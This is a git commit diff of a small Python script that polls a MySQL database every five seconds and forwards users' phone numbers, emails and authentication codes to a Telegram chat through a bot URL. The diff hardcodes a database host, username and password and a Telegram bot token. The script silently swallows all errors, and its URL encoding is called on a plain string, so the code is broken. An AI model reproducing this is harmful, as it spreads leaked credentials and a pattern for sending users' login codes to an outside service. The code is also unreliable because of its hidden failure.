43409a64072ecb4d4b58e62378abc9ba0b34d118
e.vaganov <evaganov@outlook.com>
2022-01-24 14:23:19 +0500

    Update 1.py

--- 1.py
+++ 1.py
@@ -2,28 +2,26 @@
 import urllib.request
 import time
 import mysql.connector
-import urllib.request
 
+temp_list = []
 
-if __name__ == "__main__":
-    temp_list = []
+while True:
+    time.sleep(5)
+    try:
+        mydb = mysql.connector.connect(
+        host="mbc.filmus.online",
+        user="MediseenBD",
+        password="ZAQ!2wsx",
+        database="MediseenDB"
+        )
+        cursor = mydb.cursor()
+        cursor.execute('SELECT PhoneNumber, Email, AuthCode FROM Users WHERE AuthCode is not NULL && AuthCode <> ""')
+        result = cursor.fetchall()
 
-    while(not time.sleep(5)):
-        try:
-            mydb = mysql.connector.connect(
-            host="mbc.filmus.online",
-            user="MediseenBD",
-            password="ZAQ!2wsx",
-            database="MediseenDB"
-            )
-            cursor = mydb.cursor()
-            cursor.execute('SELECT PhoneNumber, Email, AuthCode FROM Users WHERE AuthCode is not NULL && AuthCode <> ""')
-            result = cursor.fetchall()
-
-            for x in result:
-                values = urllib.parse.urlencode(' '.join(str(e) for e in x))
-                if values not in temp_list:
-                    temp_list.append(values)
-                    urllib.request.urlopen("https://api.telegram.org/bot343228570:AAHWvNfSyL-O5QgnkQXWK7DDTWL70_XHTcw/sendMessage?chat_id=-660618667&text=%s" % values)
-        except:
-            pass
+        for x in result:
+            values = urllib.parse.urlencode(' '.join(str(e) for e in x))
+            if values not in temp_list:
+                temp_list.append(values)
+                urllib.request.urlopen("https://api.telegram.org/bot343228570:AAHWvNfSyL-O5QgnkQXWK7DDTWL70_XHTcw/sendMessage?chat_id=-660618667&text=%s" % values)
+    except:
+        pass
